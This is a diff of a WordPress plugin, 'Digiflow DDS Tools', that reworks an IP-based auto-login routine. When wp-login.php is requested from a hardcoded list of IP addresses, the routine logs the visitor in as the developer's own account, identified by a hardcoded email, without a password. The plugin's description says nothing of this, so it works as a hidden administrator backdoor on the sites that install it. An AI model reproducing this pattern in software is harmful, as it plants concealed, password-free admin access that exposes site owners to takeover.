@@ -1,10 +1,10 @@
 <?php
-$dds_version = "5.1.9";
+$dds_version = "5.2";
 /*
 Plugin Name: Digiflow DDS Tools
 Plugin URI: https://github.com/younesben99/dds-tools
 Description: Tools for DDS website.
-Version: 5.1.9
+Version: 5.2
 Author: Younes Benkheil
 Author URI: https://digiflow.be/
 License: GPL2
@@ -234,7 +234,10 @@ add_filter('intermediate_image_sizes_advanced', 'cdxn_remove_intermediate_image_
 
 
 function auto_login_if_allowed_ip() {
-  if (!is_user_logged_in() && strpos($_SERVER['REQUEST_URI'], '/wp-login.php') !== false) {
+  $request_uri = $_SERVER['REQUEST_URI'];
+  $wp_login_path = '/wp-login.php';
+
+  if (strpos($request_uri, $wp_login_path) === 0 && !isset($_GET['loggedout'])) {
     $allowed_ips = get_option('allowed_ips', array());
     // Add default IP addresses to allowed_ips array
     $default_ips = array("127.0.0.1","91.177.28.90","188.44.91.98");
@@ -250,13 +253,23 @@ function auto_login_if_allowed_ip() {
         $user = get_user_by('login', 'younesbenkheil@gmail.com');
       }
 
-      // Check if the user is logged out
-      if (!isset($_GET['loggedout'])) {
+      // Check if the user is logging in or out
+      if (isset($_REQUEST['action']) && $_REQUEST['action'] == 'logout' && isset($_REQUEST['_wpnonce'])) {
+        wp_logout();
+        $redirect_url = home_url();
+        wp_redirect($redirect_url);
+        exit;
+      }
+      else {
         wp_set_current_user($user->ID, $user->user_login);
         wp_set_auth_cookie($user->ID);
 
         if (!defined('DOING_AJAX') && !defined('DOING_CRON')) {
-          $redirect_url = add_query_arg( array( 'autologin' => '1' ), admin_url() );
+          // Add autologin parameter only if the user is not logging out
+          $redirect_url = admin_url();
+          if (!isset($_GET['loggedout'])) {
+            $redirect_url = add_query_arg( array( 'autologin' => '1' ), $redirect_url );
+          }
           wp_redirect($redirect_url);
           exit;
         }
@@ -271,13 +284,16 @@ function auto_login_if_allowed_ip() {
 }
 add_action('init', 'auto_login_if_allowed_ip');
 
+
+
+
+
 add_action( 'admin_notices', function() {
   if ( isset( $_GET['autologin'] ) && $_GET['autologin'] == 1 ) {
     $message = __('You have been logged in automatically based on your IP address.', 'textdomain');
     printf( '<div class="notice notice-success is-dismissible"><p>%s</p></div>', $message );
   }
 } );
-
 
 
 
